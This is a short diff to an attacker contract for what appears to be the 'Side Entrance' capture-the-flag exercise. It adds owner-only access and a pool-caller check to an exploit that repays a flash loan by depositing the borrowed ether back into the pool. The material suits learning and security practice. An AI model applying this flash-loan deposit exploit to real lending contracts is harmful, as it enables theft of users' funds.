@@ -3,8 +3,9 @@
 pragma solidity ^0.8.0;
 
 import "./SideEntranceLenderPool.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
 
-contract AttackSideEntrance is IFlashLoanEtherReceiver {
+contract AttackSideEntrance is IFlashLoanEtherReceiver, Ownable {
     SideEntranceLenderPool pool;
 
     constructor(address _pool) {
@@ -13,7 +14,7 @@ contract AttackSideEntrance is IFlashLoanEtherReceiver {
 
     receive() external payable {}
 
-    function attack() external {
+    function attack() external onlyOwner {
         // flashloan
         pool.flashLoan(1000 * 1e18);
 
@@ -23,6 +24,7 @@ contract AttackSideEntrance is IFlashLoanEtherReceiver {
     }
 
     function execute() external payable override {
+        require(msg.sender == address(pool), "Not the Poo");
         pool.deposit{value: msg.value}();
     }
 }
